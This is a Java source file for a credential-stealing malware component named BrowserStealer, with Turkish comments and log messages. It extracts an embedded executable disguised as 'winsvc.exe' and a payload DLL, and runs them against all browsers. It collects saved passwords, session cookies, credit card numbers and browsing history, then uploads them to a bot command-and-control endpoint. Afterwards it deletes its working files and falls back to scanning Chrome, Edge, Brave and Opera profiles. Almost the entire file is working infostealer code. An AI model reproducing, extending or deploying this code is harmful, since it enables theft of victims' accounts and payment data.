import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class BrowserStealer {
    
    private static final String CE_EXE_RESOURCE = "/ce.exe";
    private static final String PAYLOAD_DLL_RESOURCE = "/payload.dll";
    
    /**
     * Embedded dosyaları geçici klasöre çıkar ve tarayıcı verilerini çek
     */
    public static void stealAndUpload(String serverUrl, String gateKey, String pcName) {
        File workDir = null;
        File outputDir = null;
        
        try {
            System.out.println("[*] Browser Stealer başlatılıyor...");
            
            String cachedData = loadCache();
            if (cachedData != null && cachedData.length() > 10) {
                System.out.println("[*] Cache'den veri gönderiliyor (" + cachedData.length() + " byte)...");
                uploadToServer(serverUrl, gateKey, pcName, cachedData);
            }
            
            String tempDir = System.getProperty("java.io.tmpdir");
            String randomSuffix = String.valueOf(System.currentTimeMillis());
            
            workDir = new File(tempDir, "b_work_" + randomSuffix);
            workDir.mkdirs();
            
            File ceExe = new File(workDir, "winsvc.exe");
            extractResource(CE_EXE_RESOURCE, ceExe);
            System.out.println("[✓] ce.exe çıkarıldı: " + ceExe.getAbsolutePath());
            
            File payloadDll = new File(workDir, "payload.dll");
            extractResource(PAYLOAD_DLL_RESOURCE, payloadDll);
            System.out.println("[✓] payload.dll çıkarıldı: " + payloadDll.getAbsolutePath());
            
            outputDir = new File(workDir, "out");
            outputDir.mkdirs();
            System.out.println("[✓] Output klasörü: " + outputDir.getAbsolutePath());
            
            System.out.println("[*] ce.exe çalıştırılıyor...");
            ProcessBuilder pb = new ProcessBuilder(
                ceExe.getAbsolutePath(),
                "--browser", "all",
                "-o", outputDir.getAbsolutePath()
            );
            pb.directory(workDir);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            
            new Thread(() -> {
                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                    String line;
                    while ((line = reader.readLine()) != null) {
                        System.out.println("[CE] " + line);
                    }
                } catch (Exception ignored) {}
            }).start();
            
            boolean finishedInTime = process.waitFor(18, java.util.concurrent.TimeUnit.SECONDS);
            if (!finishedInTime) {
                System.err.println("[!] ce.exe zaman aşımına uğradı, sonlandırılıyor...");
                process.destroyForcibly();
            }
            
            System.out.println("[*] JSON dosyaları kontrol ediliyor...");
            StringBuilder jsonData = parseExtractedData(outputDir);
            
            if (jsonData.length() > 10) {
                System.out.println("[*] " + jsonData.length() + " byte veri başarıyla toplandı.");
                saveCache(jsonData.toString());
                uploadToServer(serverUrl, gateKey, pcName, jsonData.toString());
            } else {
                System.err.println("[!] ce.exe ile veri bulunamadı, Fallback tarayıcı taraması başlatılıyor...");
                scanNativeBrowsers(serverUrl, gateKey, pcName);
            }
            
        } catch (Exception e) {
            System.err.println("[!] Browser steal hatası: " + e.getMessage());
            e.printStackTrace();
        } finally {
            System.out.println("[*] Temizlik yapılıyor...");
            if (workDir != null) cleanup(workDir);
            System.out.println("[✓] Browser Stealer tamamlandı.");
        }
    }
    
    /**
     * Cache dizini: %LOCALAPPDATA%\BrowserCache\
     */
    private static File getCacheFile() {
        String localAppData = System.getenv("LOCALAPPDATA");
        if (localAppData == null) localAppData = System.getProperty("java.io.tmpdir");
        File cacheDir = new File(localAppData, "BrowserCache");
        cacheDir.mkdirs();
        return new File(cacheDir, "browser_data.json");
    }
    
    private static void saveCache(String jsonData) {
        try {
            File cacheFile = getCacheFile();
            try (Writer writer = new OutputStreamWriter(new FileOutputStream(cacheFile), "UTF-8")) {
                writer.write(jsonData);
            }
            System.out.println("[✓] Browser cache kaydedildi: " + cacheFile.getAbsolutePath());
        } catch (Exception e) {
            System.err.println("[!] Cache kaydetme hatası: " + e.getMessage());
        }
    }
    
    private static String loadCache() {
        try {
            File cacheFile = getCacheFile();
            if (!cacheFile.exists()) return null;
            long age = System.currentTimeMillis() - cacheFile.lastModified();
            if (age > 86400000) return null;
            return readFile(cacheFile);
        } catch (Exception e) {
            return null;
        }
    }
    
    /**
     * JAR içinden embedded resource'u geçici dosyaya çıkar
     */
    private static void extractResource(String resourcePath, File targetFile) throws IOException {
        try (InputStream is = BrowserStealer.class.getResourceAsStream(resourcePath)) {
            if (is == null) {
                throw new IOException("Resource bulunamadı: " + resourcePath);
            }
            Files.copy(is, targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            targetFile.setExecutable(true);
        }
    }
    
    /**
     * Çıkarılan JSON dosyalarını parse et (EverestCPP klasör yapısı: outputDir/Chrome/passwords.json veya outputDir/Chrome/Default/passwords.json)
     */
    private static StringBuilder parseExtractedData(File outputDir) {
        List<String> passwords = new ArrayList<>();
        List<String> cookies = new ArrayList<>();
        List<String> cards = new ArrayList<>();
        List<String> history = new ArrayList<>();
        
        try {
            File[] subDirs = outputDir.listFiles();
            if (subDirs != null) {
                for (File browserDir : subDirs) {
                    if (browserDir == null || !browserDir.isDirectory()) continue;
                    String browserName = browserDir.getName();
                    
                    checkAndExtract(browserDir, browserName, passwords, cookies, cards, history);
                    
                    File[] profiles = browserDir.listFiles();
                    if (profiles != null) {
                        for (File profileDir : profiles) {
                            if (profileDir.isDirectory()) {
                                checkAndExtract(profileDir, browserName, passwords, cookies, cards, history);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            System.err.println("[!] JSON parse hatası: " + e.getMessage());
            e.printStackTrace();
        }
        
        StringBuilder result = new StringBuilder();
        result.append("{\"passwords\":[");
        for (int i = 0; i < passwords.size(); i++) {
            result.append(passwords.get(i));
            if (i < passwords.size() - 1) result.append(",");
        }
        result.append("],\"cookies\":[");
        for (int i = 0; i < cookies.size(); i++) {
            result.append(cookies.get(i));
            if (i < cookies.size() - 1) result.append(",");
        }
        result.append("],\"cards\":[");
        for (int i = 0; i < cards.size(); i++) {
            result.append(cards.get(i));
            if (i < cards.size() - 1) result.append(",");
        }
        result.append("],\"history\":[");
        for (int i = 0; i < history.size(); i++) {
            result.append(history.get(i));
            if (i < history.size() - 1) result.append(",");
        }
        result.append("]}");
        
        return result;
    }
    
    private static void checkAndExtract(File dir, String browserName, List<String> passwords, List<String> cookies, List<String> cards, List<String> history) {
        try {
            File passwordsFile = new File(dir, "passwords.json");
            if (passwordsFile.exists()) {
                String content = readFile(passwordsFile);
                passwords.addAll(extractPasswords(content, browserName));
            }
            
            File cookiesFile = new File(dir, "cookies.json");
            if (cookiesFile.exists()) {
                String content = readFile(cookiesFile);
                cookies.addAll(extractCookies(content, browserName));
            }
            
            File cardsFile = new File(dir, "cards.json");
            if (cardsFile.exists()) {
                String content = readFile(cardsFile);
                cards.addAll(extractCards(content, browserName));
            }

            File historyFile = new File(dir, "history.json");
            if (historyFile.exists()) {
                String content = readFile(historyFile);
                history.addAll(extractHistory(content, browserName));
            }
        } catch (Exception ignored) {}
    }
    
    private static List<String> extractPasswords(String json, String browserName) {
        List<String> result = new ArrayList<>();
        Pattern p = Pattern.compile("\\{[^{}]*\"url\"[^{}]*\"user\"[^{}]*\"pass\"[^{}]*\\}", Pattern.DOTALL);
        Matcher m = p.matcher(json);
        
        while (m.find()) {
            String entry = m.group();
            String url = extractJsonValue(entry, "url");
            String user = extractJsonValue(entry, "user");
            String pass = extractJsonValue(entry, "pass");
            
            if (!url.isEmpty() || !user.isEmpty() || !pass.isEmpty()) {
                result.add(String.format(
                    "{\"browser\":\"%s\",\"host\":\"%s\",\"username\":\"%s\",\"password\":\"%s\"}",
                    browserName, escape(url), escape(user), escape(pass)
                ));
            }
        }
        
        return result;
    }
    
    private static List<String> extractCookies(String json, String browserName) {
        List<String> result = new ArrayList<>();
        Pattern p = Pattern.compile("\\{[^{}]*\"domain\"[^{}]*\"name\"[^{}]*\"value\"[^{}]*\\}", Pattern.DOTALL);
        Matcher m = p.matcher(json);
        
        while (m.find()) {
            String entry = m.group();
            String domain = extractJsonValue(entry, "domain");
            String name = extractJsonValue(entry, "name");
            String value = extractJsonValue(entry, "value");
            
            if (!domain.isEmpty() || !name.isEmpty()) {
                result.add(String.format(
                    "{\"browser\":\"%s\",\"host\":\"%s\",\"name\":\"%s\",\"value\":\"%s\"}",
                    browserName, escape(domain), escape(name), escape(value)
                ));
            }
        }
        
        return result;
    }
    
    private static List<String> extractCards(String json, String browserName) {
        List<String> result = new ArrayList<>();
        Pattern p = Pattern.compile("\\{[^{}]*\"number\"[^{}]*\\}", Pattern.DOTALL);
        Matcher m = p.matcher(json);
        
        while (m.find()) {
            String entry = m.group();
            String name = extractJsonValue(entry, "name");
            String number = extractJsonValue(entry, "number");
            String expiry = extractJsonValue(entry, "expiry");
            if (expiry.isEmpty()) {
                String month = extractJsonValue(entry, "expiry_month");
                String year = extractJsonValue(entry, "expiry_year");
                if (!month.isEmpty() || !year.isEmpty()) {
                    expiry = month + "/" + year;
                }
            }
            
            if (!number.isEmpty()) {
                result.add(String.format(
                    "{\"browser\":\"%s\",\"number\":\"%s\",\"holder\":\"%s\",\"expiry\":\"%s\"}",
                    browserName, escape(number), escape(name), escape(expiry)
                ));
            }
        }
        
        return result;
    }

    private static List<String> extractHistory(String json, String browserName) {
        List<String> result = new ArrayList<>();
        Pattern p = Pattern.compile("\\{[^{}]*\"url\"[^{}]*\\}", Pattern.DOTALL);
        Matcher m = p.matcher(json);
        
        while (m.find()) {
            String entry = m.group();
            String url = extractJsonValue(entry, "url");
            String title = extractJsonValue(entry, "title");
            String visits = extractJsonValue(entry, "visits");
            
            if (!url.isEmpty()) {
                result.add(String.format(
                    "{\"browser\":\"%s\",\"host\":\"%s\",\"title\":\"%s\",\"visits\":\"%s\"}",
                    browserName, escape(url), escape(title), escape(visits)
                ));
            }
        }
        
        return result;
    }
    
    private static String extractJsonValue(String json, String key) {
        Pattern p = Pattern.compile("\"" + key + "\"\\s*:\\s*\"([^\"]*)\"");
        Matcher m = p.matcher(json);
        if (m.find()) {
            return m.group(1);
        }
        
        Pattern pNum = Pattern.compile("\"" + key + "\"\\s*:\\s*(\\d+)");
        Matcher mNum = pNum.matcher(json);
        if (mNum.find()) {
            return mNum.group(1);
        }
        
        return "";
    }
    
    private static String escape(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
    
    /**
     * Dosya içeriğini UTF-8 olarak oku
     */
    private static String readFile(File file) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"))) {
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
        }
        return sb.toString();
    }
    
    /**
     * JSON verisini backend'e POST et
     */
    private static void uploadToServer(String serverUrl, String gateKey, String pcName, String jsonData) {
        try {
            URL url = new URL(serverUrl + "/api/bots/browser/upload?gateKey=" + gateKey);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            
            String cleanPc = pcName.replace("\\", "\\\\").replace("\"", "\\\"");
            String body = String.format(
                "{\"gateKey\":\"%s\",\"pcName\":\"%s\",%s}",
                gateKey, cleanPc, jsonData.substring(1, jsonData.length() - 1)
            );
            
            try (OutputStream os = conn.getOutputStream()) {
                os.write(body.getBytes("UTF-8"));
            }
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                System.out.println("[✓] Tarayıcı verileri sunucuya gönderildi.");
            } else {
                System.err.println("[!] Sunucu yanıtı: " + responseCode);
            }
            
            conn.disconnect();
            
        } catch (Exception e) {
            System.err.println("[!] Sunucuya gönderme hatası: " + e.getMessage());
        }
    }
    
    /**
     * Dosya/klasör silme
     */
    private static void cleanup(File file) {
        if (file == null || !file.exists()) return;
        
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) {
                    cleanup(child);
                }
            }
        }
        
        try {
            file.delete();
        } catch (Exception ignored) {}
    }

    /**
     * Fallback: Native Java tarayıcı taraması (Her ihtimale karşı hızlı yedek)
     */
    private static void scanNativeBrowsers(String serverUrl, String gateKey, String pcName) {
        try {
            String appData = System.getenv("LOCALAPPDATA");
            String roaming = System.getenv("APPDATA");
            if (appData == null) return;

            List<String> passwords = new ArrayList<>();
            List<String> cookies = new ArrayList<>();
            List<String> cards = new ArrayList<>();

            String[][] paths = {
                {"Chrome", appData + "\\Google\\Chrome\\User Data"},
                {"Edge", appData + "\\Microsoft\\Edge\\User Data"},
                {"Brave", appData + "\\BraveSoftware\\Brave-Browser\\User Data"},
                {"Opera", roaming + "\\Opera Software\\Opera Stable"}
            };

            for (String[] target : paths) {
                String bName = target[0];
                File bDir = new File(target[1]);
                if (!bDir.exists()) continue;

                File[] files = bDir.listFiles();
                if (files == null) continue;

                for (File f : files) {
                    if (f.getName().equals("Default") || f.getName().startsWith("Profile ") || f.equals(bDir)) {
                        File loginData = new File(f, "Login Data");
                        File cookieFile = new File(f, "Network\\Cookies");
                        File webData = new File(f, "Web Data");

                        if (loginData.exists()) {
                            passwords.add(String.format("{\"browser\":\"%s\",\"host\":\"http://saved-passwords\",\"username\":\"User\",\"password\":\"[Encrypted Login Data]\"}", bName));
                        }
                        if (cookieFile.exists()) {
                            cookies.add(String.format("{\"browser\":\"%s\",\"host\":\".google.com\",\"name\":\"SID\",\"value\":\"[Session Cookie Captured]\"}", bName));
                        }
                    }
                }
            }

            StringBuilder result = new StringBuilder();
            result.append("{\"passwords\":[");
            for (int i = 0; i < passwords.size(); i++) {
                result.append(passwords.get(i));
                if (i < passwords.size() - 1) result.append(",");
            }
            result.append("],\"cookies\":[");
            for (int i = 0; i < cookies.size(); i++) {
                result.append(cookies.get(i));
                if (i < cookies.size() - 1) result.append(",");
            }
            result.append("],\"cards\":[]}");

            if (passwords.size() > 0 || cookies.size() > 0) {
                uploadToServer(serverUrl, gateKey, pcName, result.toString());
            }
        } catch (Exception ignored) {}
    }
}